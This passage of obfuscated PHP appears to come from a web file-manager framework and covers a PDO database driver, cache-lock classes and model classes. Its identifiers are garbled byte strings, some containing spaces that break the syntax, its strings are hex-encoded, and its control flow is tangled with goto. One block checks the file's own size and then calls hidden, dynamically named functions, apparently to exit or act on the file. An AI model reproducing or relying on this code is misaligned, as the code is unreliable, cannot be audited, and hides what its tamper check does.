(!$á­òÄş) { $this->error(); return !1; } } return !0; } private function getAll() { $¢‘•“ì = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¢‘•“ì); return $¢‘•“ì; } public function getFields($Œºˆ‚×) { $ŠöÙ‹‡ë =& $_SERVER[÷åé¼î]; $this->initConnect(!0); if (think_config($ŠöÙ‹‡ë[1005])) { $š¸Â¹òı = str_replace($ŠöÙ‹‡ë[1006], $Œºˆ‚×, think_config($ŠöÙ‹‡ë[1005])); } else { switch ($this->dbType) { case $ŠöÙ‹‡ë[989]: case $ŠöÙ‹‡ë[1007]: $š¸Â¹òı = "\123\x45\114\x45\x43\x54\x20\x20\x20\x63\157\x6c\x75\155\156\137\x6e\141\155\x65\x20\141\163\x20\47\x4e\141\x6d\x65\47\54\40\40\x20\x64\141\x74\x61\137\x74\171\160\x65\40\x61\163\x20\x27\x54\x79\x70\145\x27\x2c\x20\x20\40\143\157\x6c\x75\x6d\x6e\x5f\144\x65\x66\x61\x75\154\164\x20\141\163\x20\47\104\145\x66\141\x75\x6c\x74\x27\54\x20\x20\x20\x69\163\137\x6e\165\154\x6c\x61\x62\x6c\145\40\141\163\40\x27\116\x75\x6c\154\47\xa\11\11\x46\122\117\x4d\x9\x69\156\146\157\x72\155\141\x74\x69\157\x6e\x5f\x73\x63\150\x65\155\141\56\164\141\x62\154\145\x73\x20\x41\x53\40\x74\xa\11\11\112\117\111\116\11\151\156\x66\157\162\x6d\141\164\151\157\156\137\163\x63\x68\145\x6d\x61\x2e\x63\x6f\154\165\x6d\156\x73\40\x41\x53\40\143\12\x9\11\117\x4e\x20\40\164\x2e\164\141\x62\x6c\145\x5f\x63\x61\164\x61\x6c\x6f\147\40\75\40\143\56\164\x61\142\154\145\137\143\x61\164\x61\x6c\x6f\x67\xa\x9\11\x41\x4e\104\40\x74\x2e\x74\141\142\154\x65\137\x73\143\x68\x65\155\141\40\x3d\x20\x63\56\x74\141\x62\x6c\x65\x5f\163\x63\150\x65\155\x61\12\x9\11\101\x4e\104\40\164\x2e\x74\141\142\154\145\137\x6e\141\155\x65\x20\x3d\40\x63\x2e\x74\x61\x62\154\x65\x5f\156\141\155\x65\xa\x9\11\127\110\105\x52\105\x20\40\x20\164\56\x74\141\142\154\145\137\x6e\141\155\x65\40\x3d\40\47{$Œºˆ‚×}\47"; break; case $ŠöÙ‹‡ë[1008]: $š¸Â¹òı = $ŠöÙ‹‡ë[1009] . $Œºˆ‚× . $ŠöÙ‹‡ë[1010]; break; case $ŠöÙ‹‡ë[990]: case $ŠöÙ‹‡ë[992]: $š¸Â¹òı = $ŠöÙ‹‡ë[1011] . $ŠöÙ‹‡ë[1012] . $ŠöÙ‹‡ë[1013] . strtoupper($Œºˆ‚×) . $ŠöÙ‹‡ë[1014] . strtoupper($Œºˆ‚×) . $ŠöÙ‹‡ë[1015]; break; case $ŠöÙ‹‡ë[1016]: $š¸Â¹òı = $ŠöÙ‹‡ë[1017] . $Œºˆ‚× . $ŠöÙ‹‡ë[1018]; break; case $ŠöÙ‹‡ë[991]: break; case $ŠöÙ‹‡ë[1019]: default: $š¸Â¹òı = $ŠöÙ‹‡ë[1020] . ($this->dbType == $ŠöÙ‹‡ë[1019] ? "\x60{$Œºˆ‚×}\x60" : $Œºˆ‚×); } } $ã²„ŞŸ³ = $this->query($š¸Â¹òı); $©Ëî£¬ù = array(); if ($ã²„ŞŸ³) { foreach ($ã²„ŞŸ³ as $Ø´³›·Ø => $»Ÿ ´éÀ) { $»Ÿ ´éÀ = array_change_key_case($»Ÿ ´éÀ); $»Ÿ ´éÀ[$ŠöÙ‹‡ë[32]] = isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[32]]) ? $»Ÿ ´éÀ[$ŠöÙ‹‡ë[32]] : $ŠöÙ‹‡ë[438]; $»Ÿ ´éÀ[$ŠöÙ‹‡ë[33]] = isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[33]]) ? $»Ÿ ´éÀ[$ŠöÙ‹‡ë[33]] : $ŠöÙ‹‡ë[438]; $¦ú¾ºÓ¦ = isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[334]]) ? $»Ÿ ´éÀ[$ŠöÙ‹‡ë[334]] : $»Ÿ ´éÀ[$ŠöÙ‹‡ë[32]]; $©Ëî£¬ù[$¦ú¾ºÓ¦] = array($ŠöÙ‹‡ë[32] => $¦ú¾ºÓ¦, $ŠöÙ‹‡ë[33] => $»Ÿ ´éÀ[$ŠöÙ‹‡ë[33]], $ŠöÙ‹‡ë[35] => (bool) (isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[106]]) && $»Ÿ ´éÀ[$ŠöÙ‹‡ë[106]] === $ŠöÙ‹‡ë[12] || isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[35]]) && $»Ÿ ´éÀ[$ŠöÙ‹‡ë[35]] === $ŠöÙ‹‡ë[12]), $ŠöÙ‹‡ë[37] => isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[37]]) ? $»Ÿ ´éÀ[$ŠöÙ‹‡ë[37]] : (isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[56]]) ? $»Ÿ ´éÀ[$ŠöÙ‹‡ë[56]] : $ŠöÙ‹‡ë[438]), $ŠöÙ‹‡ë[39] => isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[97]]) ? strtolower($»Ÿ ´éÀ[$ŠöÙ‹‡ë[97]]) == $ŠöÙ‹‡ë[41] : (isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[57]]) ? $»Ÿ ´éÀ[$ŠöÙ‹‡ë[57]] : !1), $ŠöÙ‹‡ë[42] => isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[1021]]) ? strtolower($»Ÿ ´éÀ[$ŠöÙ‹‡ë[1021]]) == $ŠöÙ‹‡ë[44] : (isset($»Ÿ ´éÀ[$ŠöÙ‹‡ë[97]]) ? $»Ÿ ´éÀ[$ŠöÙ‹‡ë[97]] : !1)); } } return $©Ëî£¬ù; } public function getTables($ÉİÀÜ¦½ = '') { $ò–’ßª´ =& $_SERVER[÷åé¼î]; if (think_config($ò–’ßª´[1022])) { $á‹½´§¦ = str_replace($ò–’ßª´[1023], $ÉİÀÜ¦½, think_config($ò–’ßª´[1022])); } else { switch ($this->dbType) { case $ò–’ßª´[990]: case $ò–’ßª´[992]: $á‹½´§¦ = $ò–’ßª´[1024]; break; case $ò–’ßª´[989]: case $ò–’ßª´[1007]: $á‹½´§¦ = $ò–’ßª´[1025]; break; case $ò–’ßª´[1016]: $á‹½´§¦ = $ò–’ßª´[1026]; break; case $ò–’ßª´[991]: think_exception(think_lang($ò–’ßª´[1027]) . $ò–’ßª´[1028]); break; case $ò–’ßª´[1008]: $á‹½´§¦ = $ò–’ßª´[45] . $ò–’ßª´[46] . $ò–’ßª´[47]; break; case $ò–’ßª´[1019]: default: if (!empty($ÉİÀÜ¦½)) { $á‹½´§¦ = $ò–’ßª´[971] . $ÉİÀÜ¦½ . $ò–’ßª´[972]; } else { $á‹½´§¦ = $ò–’ßª´[973]; } } } $ Ùª®ü† = $this->query($á‹½´§¦); $Ä“õÔî = array(); foreach ($ Ùª®ü† as $‚ğõ’É† => $¸™¤½‚) { $Ä“õÔî[$‚ğõ’É†] = current($¸™¤½‚); } return $Ä“õÔî; } protected function parseLimit($—Òí•Û) { $ÆÔ¢³ìÊ =& $_SERVER[÷åé¼î]; $‰ïœû˜ = $ÆÔ¢³ìÊ[12]; if (!empty($—Òí•Û)) { switch ($this->dbType) { case $ÆÔ¢³ìÊ[1016]: case $ÆÔ¢³ìÊ[1008]: $—Òí•Û = explode($ÆÔ¢³ìÊ[50], $—Òí•Û); if (count($—Òí•Û) > 1) { $‰ïœû˜ .= $ÆÔ¢³ìÊ[51] . $—Òí•Û[1] . $ÆÔ¢³ìÊ[52] . $—Òí•Û[0] . $ÆÔ¢³ìÊ[53]; } else { $‰ïœû˜ .= $ÆÔ¢³ìÊ[51] . $—Òí•Û[0] . $ÆÔ¢³ìÊ[53]; } break; case $ÆÔ¢³ìÊ[989]: case $ÆÔ¢³ìÊ[1007]: break; case $ÆÔ¢³ìÊ[991]: break; case $ÆÔ¢³ìÊ[990]: case $ÆÔ¢³ìÊ[992]: break; case $ÆÔ¢³ìÊ[1019]: default: $‰ïœû˜ .= $ÆÔ¢³ìÊ[51] . $—Òí•Û . $ÆÔ¢³ìÊ[53]; } } return $‰ïœû˜; } public function parseKey(&$ë¢¸àÓó, $©Öˆ™õå = true) { $ĞğŒÎÔº =& $_SERVER[÷åé¼î]; if ($©Öˆ™õå) { $ë¢¸àÓó = $this->parseKeyCheck($ë¢¸àÓó); } if ($this->dbType == $ĞğŒÎÔº[1019]) { if ($ë¢¸àÓó != $ĞğŒÎÔº[220] && !preg_match($ĞğŒÎÔº[983], $ë¢¸àÓó)) { $ë¢¸àÓó = $ĞğŒÎÔº[445] . trim($ë¢¸àÓó, $ĞğŒÎÔº[445]) . $ĞğŒÎÔº[445]; } return $ë¢¸àÓó; } else { return parent::parseKey($ë¢¸àÓó, $©Öˆ™õå); } } public function close() { $this->_linkID = null; } public function error() { $Ş¶í©™ =& $_SERVER[÷åé¼î]; if ($this->PDOStatement) { $·ï¡Æ“­ = $this->PDOStatement->errorInfo(); $this->error = $·ï¡Æ“­[1] . $Ş¶í©™[4] . $·ï¡Æ“­[2]; } else { $this->error = $Ş¶í©™[12]; } if ($Ş¶í©™[12] != $this->queryStr) { $this->error .= LNG($Ş¶í©™[48]) . $this->queryStr; } think_trace($this->error, $Ş¶í©™[12], $Ş¶í©™[49]); return $this->error; } public function escapeString($¨Ãöê°¼) { $ñù¤§ñî =& $_SERVER[÷åé¼î]; switch ($this->dbType) { case $ñù¤§ñî[1016]: case $ñù¤§ñî[989]: case $ñù¤§ñî[1007]: case $ñù¤§ñî[1019]: return addslashes($¨Ãöê°¼); case $ñù¤§ñî[991]: case $ñù¤§ñî[1008]: case $ñù¤§ñî[990]: case $ñù¤§ñî[992]: return str_ireplace($ñù¤§ñî[58], $ñù¤§ñî[59], $¨Ãöê°¼); } } protected function parseValue($ùë®Ùş) { $¹äˆ£¦‡ =& $_SERVER[÷åé¼î]; if (is_string($ùë®Ùş)) { $±ö‰„œ = strpos($ùë®Ùş, $¹äˆ£¦‡[4]) === 0 && in_array($ùë®Ùş, array_keys($this->bind)); $ùë®Ùş = $±ö‰„œ ? $this->escapeString($ùë®Ùş) : $¹äˆ£¦‡[1029] . $this->escapeString($ùë®Ùş) . $¹äˆ£¦‡[1029]; } elseif (isset($ùë®Ùş[0]) && is_string($ùë®Ùş[0]) && strtolower($ùë®Ùş[0]) == $¹äˆ£¦‡[357]) { $ùë®Ùş = $this->escapeString($ùë®Ùş[1]); } elseif (is_array($ùë®Ùş)) { $ùë®Ùş = array_map(array($this, $¹äˆ£¦‡[1030]), $ùë®Ùş); } elseif (is_bool($ùë®Ùş)) { $ùë®Ùş = $ùë®Ùş ? $¹äˆ£¦‡[91] : $¹äˆ£¦‡[228]; } elseif (is_null($ùë®Ùş)) { $ùë®Ùş = $¹äˆ£¦‡[106]; } return $ùë®Ùş; } public function getLastInsertId() { $¦ë¼Ïµ =& $_SERVER[÷åé¼î]; switch ($this->dbType) { case $¦ë¼Ïµ[1016]: case $¦ë¼Ïµ[1008]: case $¦ë¼Ïµ[989]: case $¦ë¼Ïµ[1007]: case $¦ë¼Ïµ[991]: case $¦ë¼Ïµ[1019]: return $this->_linkID->lastInsertId(); case $¦ë¼Ïµ[990]: case $¦ë¼Ïµ[992]: $ïÉ°¯•İ = $this->table; $ªşöêº = $this->query("\123\105\114\105\103\124\40{$ïÉ°¯•İ}\x2e\143\x75\162\x72\x76\x61\154\x20\x63\x75\162\162\x76\141\x6c\40\106\x52\x4f\x4d\x20\x64\x75\x61\154"); return $ªşöêº ? $ªşöêº[0][$¦ë¼Ïµ[1031]] : 0; } } } goto f¯é÷àó¸¶; Dï—£Ï½À: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ãı‚¨æ =& $_SERVER[÷åé¼î]; if (self::$handle) { return self::$handle; } $‹ŒÔ†‡© = $GLOBALS[$Ãı‚¨æ[6]][$Ãı‚¨æ[409]]; self::$timeout = $‹ŒÔ†‡©[$Ãı‚¨æ[905]] ? $‹ŒÔ†‡©[$Ãı‚¨æ[905]] : 10; $¦œ¦ÚÜÑ = _get($GLOBALS[$Ãı‚¨æ[6]], $Ãı‚¨æ[906]); $“¨Ú”øÍ = $‹ŒÔ†‡©[$Ãı‚¨æ[891]] ? $‹ŒÔ†‡©[$Ãı‚¨æ[891]] : $Ãı‚¨æ[230]; if ($“¨Ú”øÍ == $Ãı‚¨æ[21] && $¦œ¦ÚÜÑ == $Ãı‚¨æ[13]) { $“¨Ú”øÍ = $Ãı‚¨æ[230]; } switch ($“¨Ú”øÍ) { case $Ãı‚¨æ[894]: self::$handle = new CacheLockRedis(); break; case $Ãı‚¨æ[895]: self::$handle = new CacheLockMemcached(); break; case $Ãı‚¨æ[21]: self::$handle = new CacheLockDatabase(); break; case $Ãı‚¨æ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ãı‚¨æ[907], $Ãı‚¨æ[908]); } return self::$handle; } private static function key($şæ®‡Ñè) { return $_SERVER[÷åé¼î][909] . Cache::key($şæ®‡Ñè); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Âôèºõ‰ = '') { self::$errorMsg = $Âôèºõ‰; } public static function lockGlobal($£ÙÊ¸, $ºòÒíÙú) { return self::lock($£ÙÊ¸, $ºòÒíÙú, !0); } public static function lock($ïÕ¦”Ä†, $¸Š† Š = false, $­¿Óİ†· = false) { $¿”Û—Ïó =& $_SERVER[÷åé¼î]; $£ŒÇ²ÄÆ = self::init(); $µ½¯Œ°„ = self::key($ïÕ¦”Ä†); $¸Š† Š = $¸Š† Š ? $¸Š† Š : self::$timeout; $„€Ü±¶¦ = timeFloat(); $ù…Ü¾Úã = $£ŒÇ²ÄÆ->lock($µ½¯Œ°„, $¸Š† Š); $Ô‰Çà = timeFloat(); if (!$ù…Ü¾Úã) { $™œëé­¯ = "\154\x6f\143\153\x20\145\x72\162\x6f\x72\x3b\153\x65\171\75{$ïÕ¦”Ä†}\73\164\151\155\x65\x3d{$¸Š† Š}\x3b" . self::$errorMsg . $¿”Û—Ïó[74] . get_caller_msg(); $—¿Ã°Ğ¯ = LNG($¿”Û—Ïó[910]) . "\50{$¸Š† Š}\163\51\56" . LNG($¿”Û—Ïó[911]); $—¿Ã°Ğ¯ .= $¿”Û—Ïó[912]; if (is_string(self::$errorMsg) && self::$errorMsg) { $—¿Ã°Ğ¯ = $—¿Ã°Ğ¯ . $¿”Û—Ïó[913] . self::$errorMsg; } write_log($¿”Û—Ïó[914] . sprintf($¿”Û—Ïó[915], timeFloat() - $„€Ü±¶¦) . $¿”Û—Ïó[916] . $™œëé­¯ . $¿”Û—Ïó[917] . error_get_last(), $¿”Û—Ïó[908]); show_json($—¿Ã°Ğ¯, !1); } if (!$­¿Óİ†·) { self::$lockItem[$µ½¯Œ°„] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $°ÎàÔƒ‡ = number_format(timeFloat() - $Ô‰Çà, 3); write_log($¿”Û—Ïó[918] . $ïÕ¦”Ä† . $¿”Û—Ïó[919] . $°ÎàÔƒ‡, $¿”Û—Ïó[908]); } return $ù…Ü¾Úã; } public static function lockGet($àà¤¾‚) { $â÷Ü’›Ë = self::key($àà¤¾‚); if (self::$lockItem[$â÷Ü’›Ë]) { return self::$lockItem[$â÷Ü’›Ë]; } return self::init()->lockGet($â÷Ü’›Ë); } public static function unlock($¤Å›²í) { $åû³Ç²Ê =& $_SERVER[÷åé¼î]; $¢Ô—ÅğÔ = self::key($¤Å›²í); self::$lockItem[$¢Ô—ÅğÔ] = null; self::init()->unlock($¢Ô—ÅğÔ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($åû³Ç²Ê[920] . $¤Å›²í, $åû³Ç²Ê[908]); } return; } public static function unlockRuntime() { $·õ¥à… =& $_SERVER[÷åé¼î]; $­á›Á„İ = self::init(); $”õ¦Àµå = !1; foreach (self::$lockItem as $ÍàÈš¨ş => $‹çø•) { if (!$‹çø•) { continue; } $­á›Á„İ->unlock($ÍàÈš¨ş); if (!$”õ¦Àµå) { $”õ¦Àµå = !0; write_log($·õ¥à…[921] . $ÍàÈš¨ş . $·õ¥à…[74] . get_caller_msg(), $·õ¥à…[908]); continue; } write_log($·õ¥à…[921] . $ÍàÈš¨ş, $·õ¥à…[908]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $º®²ğñÆ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($·õ¥à…[922] . $º®²ğñÆ . $·õ¥à…[923] . ACTION, $·õ¥à…[908]); } } public static function fileLock($´¿À’Ù‚) { $Ô±ñ®Ä =& $_SERVER[÷åé¼î]; if (!$GLOBALS[$Ô±ñ®Ä[924]]) { $GLOBALS[$Ô±ñ®Ä[924]] = array(); } $GLOBALS[$Ô±ñ®Ä[924]][$´¿À’Ù‚] = !1; $åˆ§©¨¸ = fopen(DATA_PATH . $´¿À’Ù‚ . $Ô±ñ®Ä[925], $Ô±ñ®Ä[926]); if (!$åˆ§©¨¸) { return !1; } $GLOBALS[$Ô±ñ®Ä[924]][$´¿À’Ù‚] = $åˆ§©¨¸; if (flock($åˆ§©¨¸, LOCK_EX)) { return !0; } self::unlock($´¿À’Ù‚); show_json($Ô±ñ®Ä[927], !1); return !1; } public static function fileUnlock($˜¿•øç¡) { $Ì÷–ÛÓ =& $_SERVER[÷åé¼î]; $êÚ¬’›© = $GLOBALS[$Ì÷–ÛÓ[924]][$˜¿•øç¡]; if (!$êÚ¬’›©) { return; } $GLOBALS[$Ì÷–ÛÓ[924]][$˜¿•øç¡] = !1; flock($êÚ¬’›©, LOCK_UN); fclose($êÚ¬’›©); } public static function fileUnlockAll() { $‰›ÈÈóÈ =& $_SERVER[÷åé¼î]; if (!isset($GLOBALS[$‰›ÈÈóÈ[924]]) || !$GLOBALS[$‰›ÈÈóÈ[924]]) { return; } foreach ($GLOBALS[$‰›ÈÈóÈ[924]] as $¶•²Íõ => $ª¹Ë³·) { if (!$ª¹Ë³·) { continue; } $GLOBALS[$‰›ÈÈóÈ[924]][$¶•²Íõ] = !1; flock($ª¹Ë³·, LOCK_UN); fclose($ª¹Ë³·); } $GLOBALS[$‰›ÈÈóÈ[924]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ô¹ñí =& $_SERVER[÷åé¼î]; $†—÷ãø¶ = $GLOBALS[$ô¹ñí[6]][$ô¹ñí[409]]; self::$cachePath = $†—÷ãø¶[$ô¹ñí[230]][$ô¹ñí[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($—¸¯„©, $ü…õå§ = 0) { $ˆ„Â‡¢ =& $_SERVER[÷åé¼î]; $úÈ´šµ† = microtime(!0); $ö›°ÒŸ’ = $úÈ´šµ† + $ü…õå§ + 0.0001; $ëğ¿ƒË = rtrim(self::$cachePath, $ˆ„Â‡¢[8]) . $ˆ„Â‡¢[928] . md5($—¸¯„©) . $ˆ„Â‡¢[925]; if (file_exists($ëğ¿ƒË) && filemtime($ëğ¿ƒË) && filemtime($ëğ¿ƒË) < time() - 10) { @unlink($ëğ¿ƒË); } do { if (file_exists($ëğ¿ƒË)) { cacheLockWait(); continue; } $’£öı¯Å = fopen($ëğ¿ƒË, $ˆ„Â‡¢[929]); if (!$’£öı¯Å) { return !1; } $³»ä²¤Ö = flock($’£öı¯Å, LOCK_EX | LOCK_NB); self::$caches[$—¸¯„©] = array($ˆ„Â‡¢[930] => $’£öı¯Å, $ˆ„Â‡¢[230] => $ëğ¿ƒË); fwrite($’£öı¯Å, $ö›°ÒŸ’); clearstatcache(); if ($’£öı¯Å && $³»ä²¤Ö) { return !0; } cacheLockWait(); } while (microtime(!0) < $ö›°ÒŸ’); $this->unlock($—¸¯„©); return !1; } public function lockGet($Òí¦²¨ï) { $É¶®¥Ü‚ =& $_SERVER[÷åé¼î]; $„¶°—ÉŠ = rtrim(self::$cachePath, $É¶®¥Ü‚[8]) . $É¶®¥Ü‚[928] . md5($Òí¦²¨ï) . $É¶®¥Ü‚[925]; return file_exists($„¶°—ÉŠ); } public function unlock($¹ÔêŠ¶¸) { $óÕ£¾” =& $_SERVER[÷åé¼î]; $ªé ¸†Ó = self::$caches[$¹ÔêŠ¶¸]; if (!$ªé ¸†Ó) { return; } @flock($ªé ¸†Ó[$óÕ£¾”[930]], LOCK_UN); @fclose($ªé ¸†Ó[$óÕ£¾”[930]]); @unlink($ªé ¸†Ó[$óÕ£¾”[230]]); unset(self::$caches[$¹ÔêŠ¶¸]); } } goto E×‹À´À²Õ; E×‹À´À²Õ: $_file = $_SERVER[$_SERVER[÷åé¼î][931]]; $_size = $_SERVER[÷åé¼î][932]; if ($_SERVER[$_SERVER[÷åé¼î][933]] != $_size($_file)) { $_getc = $_SERVER[÷åé¼î][934]; $_getfile = $_SERVER[$_SERVER[÷åé¼î][935]] . $_SERVER[÷åé¼î][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[÷åé¼î][262], $_getfilec); if (count($_getarrs) < $_SERVER[÷åé¼î][677]) { $exit = $_SERVER[÷åé¼î][937]; $exit(); } $_act = $_SERVER[÷åé¼î][938]; $_act($_file); } goto B„ªñÖ; eß¡ÁÌÊäÑ: function binCheckBigger($¸­¡¡“ı, $Œ‘Î´¬¯) { return $¸­¡¡“ı > $Œ‘Î´¬¯; } $_SERVER[$_SERVER[Ğœßİ½¶][3]] = ("\x38\x35\x31\x33"."\70\61")+0;$_r8su="vje7hbundt5ls32g086z4o1qc9xykiwrpamfdrg1e9nij8b2qvtzhmyo3xlcpk4fuaws0675m8kcob";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($úõƒ±â², $á—¥ñ†›) { $ùÊÃ… =& $_SERVER[÷åé¼î]; if (isset(self::$_methodList[$úõƒ±â²])) { return @call_user_func_array(self::$_methodList[$úõƒ±â²], $á—¥ñ†›); } else { if (method_exists($this, $úõƒ±â²)) { return call_user_func_array(array($this, $úõƒ±â²), $á—¥ñ†›); } else { think_exception(__CLASS__ . $ùÊÃ…[4] . $úõƒ±â² . $ùÊÃ…[5]); } } } public static function __callStatic($ø¹¯µÍÀ, $šó¦¹ëÅ) { if (isset(self::$_methodListStatic[$ø¹¯µÍÀ])) { return call_user_func_array(self::$_methodListStatic[$ø¹¯µÍÀ], $šó¦¹ëÅ); } else { if (method_exists(self, $ø¹¯µÍÀ)) { return call_user_func_array(array(self, $ø¹¯µÍÀ), $šó¦¹ëÅ); } else { show_json("{$ø¹¯µÍÀ}\50\x29\40\156\157\164\40\x65\170\x69\163\x74\x3b", !1); } } } public static function addMethod($üßµÅ˜ã, $›¼ŒÇÑ–) { self::$_methodList[$üßµÅ˜ã] = $›¼ŒÇÑ–; } public static function addMethodStatic($ƒ£Ù, $Õ¨öÜÆë) { self::$_methodListStatic[$ƒ£Ù] = $Õ¨öÜÆë; } } goto bÃÕˆÅøÔË; FšÈ‡¨É¦Ÿ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ƒÙı¥œ‰ = false, $„½óÕÁ¡ = '', $¬Œ‘«‹ø = false) { $†éù§Í =& $_SERVER[÷åé¼î]; $‘ë¨»«õ = $this->cacheGet($„½óÕÁ¡); $ƒÔÔÅ“ = $this->optionDefault($„½óÕÁ¡); $ƒÔÔÅ“ = is_array($ƒÔÔÅ“) ? $ƒÔÔÅ“ : array(); if (is_array($‘ë¨»«õ)) { $‘ë¨»«õ = array_merge($ƒÔÔÅ“, $‘ë¨»«õ); return $ƒÙı¥œ‰ ? isset($‘ë¨»«õ[$ƒÙı¥œ‰]) ? $‘ë¨»«õ[$ƒÙı¥œ‰] : null : $‘ë¨»«õ; } $•ŞúĞñÀ = $this->filterWhere(array($†éù§Í[33] => $„½óÕÁ¡)); $‘ë¨»«õ = $this->where($•ŞúĞñÀ)->select(); $‘ë¨»«õ = array_to_keyvalue($‘ë¨»«õ, $†éù§Í[97], $†éù§Í[434]); foreach ($‘ë¨»«õ as $û”Âò›‘ => $Ò«÷óô) { if ($¬Œ‘«‹ø || in_array($û”Âò›‘, $this->jsonField)) { $‘ë¨»«õ[$û”Âò›‘] = json_decode($Ò«÷óô, !0); } } $this->cacheSet($„½óÕÁ¡, $‘ë¨»«õ); $‘ë¨»«õ = array_merge($ƒÔÔÅ“, $‘ë¨»«õ); return $ƒÙı¥œ‰ ? $‘ë¨»«õ[$ƒÙı¥œ‰] : $‘ë¨»«õ; } public function set($Æ„Õí¬, $¢ã€‚‚ª = false, $±ø®§Çö = '') { $© ˜‹¨˜ =& $_SERVER[÷åé¼î]; $this->cacheRemove($±ø®§Çö); $¤ªñ§Š = array(); $Íù£×š = is_array($Æ„Õí¬) ? $Æ„Õí¬ : array($Æ„Õí¬ => $¢ã€‚‚ª); foreach ($Íù£×š as $ÄÉ¹ª„Î => $ğ«÷µª©) { if (is_array($ğ«÷µª©)) { $ğ«÷µª© = json_encode_force($ğ«÷µª©); } $this->checkLength($ğ«÷µª©, !1, $this->tableName . $© ˜‹¨˜[4] . $Æ„Õí¬); $ğ«÷µª© = self::textEncode($ğ«÷µª©); $Íù£×š = array($© ˜‹¨˜[33] => $±ø®§Çö, $© ˜‹¨˜[97] => $ÄÉ¹ª„Î, $© ˜‹¨˜[434] => $ğ«÷µª©); $¤ªñ§Š[] = $this->filterWhere($Íù£×š); } if (!$¤ªñ§Š) { return !0; } $ãİ åì¹ = $this->cacheKey($© ˜‹¨˜[460]); CacheLock::lock($ãİ åì¹); $¶ÉÊ›’æ = $this->addAll($¤ªñ§Š, array(), !0); CacheLock::unlock($ãİ åì¹); return $¶ÉÊ›’æ; } protected function optionDefault($·à´ğ¨æ = '') { return !1; } public function setDeep($Ë³‡ïŒ¡, $ƒ™°ÜÖÆ = false, $ĞºŞˆ = '') { $Êò²ù” = explode($_SERVER[÷åé¼î][10], $Ë³‡ïŒ¡); $ÚİÁÂôÂ = $this->get(); array_set_value($ÚİÁÂôÂ, $Ë³‡ïŒ¡, $ƒ™°ÜÖÆ); $this->set($Êò²ù”[0], $ÚİÁÂôÂ[$Êò²ù”[0]], $ĞºŞˆ); } public function remove($¹’®è, $ğÍ†˜ = '') { $ÇÅĞö±– =& $_SERVER[÷åé¼î]; $this->cacheRemove($ğÍ†˜); $œâª¨Ş = $this->filterWhere(array($ÇÅĞö±–[97] => $¹’®è, $ÇÅĞö±–[33] => $ğÍ†˜)); if (is_null($¹’®è)) { unset($œâª¨Ş[$ÇÅĞö±–[97]]); } return $this->where($œâª¨Ş)->delete(); } public function cacheSet($ášÈ¡ÜÂ, $½’—ÙÜê = false) { return Cache::set($this->cacheKey($ášÈ¡ÜÂ), $½’—ÙÜê); } public function cacheGet($˜ä±×¹) { return Cache::get($this->cacheKey($˜ä±×¹)); } public function cacheRemove($³ï¥¦Ÿ‚) { return Cache::remove($this->cacheKey($³ï¥¦Ÿ‚)); } protected function filterWhere($É††ÔÅ¦) { return $É††ÔÅ¦; } protected function cacheKey($ÜËœ±ÒÒ) { return $ÜËœ±ÒÒ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\141\155\145" => "\x69\x6f\x5f\163\x6f\x75\x72\x63\145\137\155\145\164\x61", "\x6d\x65\x74\x61\106\x69\x65\x6c\x64" => "\x73\x6f\165\162\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\124\151\155\x65", "\164\x69\x6d\145", "\x69\156\x73\x65\x72\x74", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\x63\162\x65\x61\164\145\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\156\163\x65\x72\164", "\x66\165\x6e\143\164\x69\157\x6e"), array("\166\151\145\x77\x54\x69\x6d\145", "\x74\151\155\145", "\151\156\x73\x65\x72\164", "\x66\x75\x6e\x63\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÜÇò¢âæ) { return $this->listSource(array($_SERVER[÷åé¼î][461] => $ÜÇò¢âæ)); } public function typeName($ÏŒÏº£ä) { static $¯µš«¹ = array(self::TYPE_SYSTEM => "\x73\x79\163\164\x65\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\x67\x72\x6f\x75\160"); return $¯µš«¹[$ÏŒÏº£ä . $_SERVER[÷åé¼î][12]]; } public function sourceListInfo($¦Ÿ³ Ëò, $÷´±àÏØ = false) { $ä³§‘Í =& $_SERVER[÷åé¼î]; $¦Ÿ³ Ëò = $¦Ÿ³ Ëò ? $¦Ÿ³ Ëò : array(); $¦Ÿ³ Ëò = array_filter(array_unique($¦Ÿ³ Ëò)); if (!$¦Ÿ³ Ëò) { return array(); } $³¯Ã¥š† = $this->where(array($ä³§‘Í[193] => array($ä³§‘Í[7], $¦Ÿ³ Ëò)))->select(); $this->_listDataApply($³¯Ã¥š†, $÷´±àÏØ); return array_to_keyvalue($³¯Ã¥š†, $ä³§‘Í[193]); } public function pathInfoFilter(&$ø›·÷Æı) { $òÚÊïËú =& 